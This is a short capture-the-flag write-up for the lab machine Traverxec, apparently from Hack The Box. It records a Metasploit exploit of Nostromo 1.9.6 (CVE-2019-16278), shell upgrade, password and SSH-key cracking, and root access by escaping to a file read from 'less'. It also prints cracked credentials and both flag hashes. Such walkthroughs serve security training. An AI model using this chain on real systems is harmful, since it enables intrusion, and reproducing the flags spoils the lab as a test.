# Traverxec
Nmap Ports:
22
80 <== Nostromo 1.9.6

Metasploit CVE-2019-16278 for port 80 results in www-data shell. 

using python -c 'import pty; pty.spawn("/bin/bash")' gives interactive shell

ran LinEnum using python -m SimpleHTTPServer 8000

In nostromo conf:
 MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html
# LOGS [OPTIONAL]
logpid			logs/nhttpd.pid
# SETUID [RECOMMENDED]
user			www-data
# BASIC AUTHENTICATION [OPTIONAL]
htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd
# ALIASES [OPTIONAL]
/icons			/var/nostromo/icons
# HOMEDIRS [OPTIONAL]
homedirs		/home
homedirs_public		public_www

using this info, went to /home/david/public_www/protected-file-area
creds from .htpasswd cracked with rockyou.txt
Nowonly4me       (david)

using conf info to navigate to http://10.10.10.165/~david/protected-file-area/ and auth with 'david' and 'Nowonly4me' in firefox yeilds ssh keys.

Now running id_rsa though ssh2john, then cracking gives password 'hunter'.

$ ssh david@10.10.10.165 -i id_rsa 
password: hunter

david user.txt = 7db0b48469606a42cec20750d9782f3d

running: 
find . -perm /4000
shows 'less' has SUID


cd to ./bin/less

running
david@traverxec:~/bin$ cat script.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service


opens 'less', 'e' puts it in examine mode:
:e /root/root.txt
root.txt = 9aa36a6d76f785dfd320a478f6e0d906

